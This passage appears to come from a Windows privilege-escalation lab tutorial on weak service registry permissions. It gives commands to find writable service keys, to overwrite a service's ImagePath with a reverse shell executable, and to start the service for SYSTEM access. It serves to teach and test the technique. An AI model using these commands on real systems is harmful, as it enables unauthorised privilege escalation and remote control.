The Windows registry stores entries for each service.  
Since registry entries can have ACLs, if the ACL is  
misconfigured, it may be possible to modify a service’s  
configuration even if we cannot modify the service  
directly.

1.Run winPEAS to check for service misconfigurations:  
`.\winPEASany.exe quiet servicesinfo`

> 2.Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell:
> 
> > [+] Looking if you can modify any service registry()  
> > [?] Check if you can modify the registry of a service HKLM\system\currentcontrolset\e services\regsvc (Interactiv[TakeOwnership])

`PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List`

3.Alternatively accesschk.exe can be used to confirm:  
`.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

4.Overwrite the ImagePath registry key to point to our reverse shell executable:  
`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

5.Start a listener on Kali, and then start the service to trigger the exploit:  
`> net start regsvc`

You should check if you can modify any service registry.  
You can **check** your **permissions** over a service **registry** doing:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

It should be checked whether **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** possess `FullControl` permissions. If so, the binary executed by the service can be altered.

To change the Path of the binary executed:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```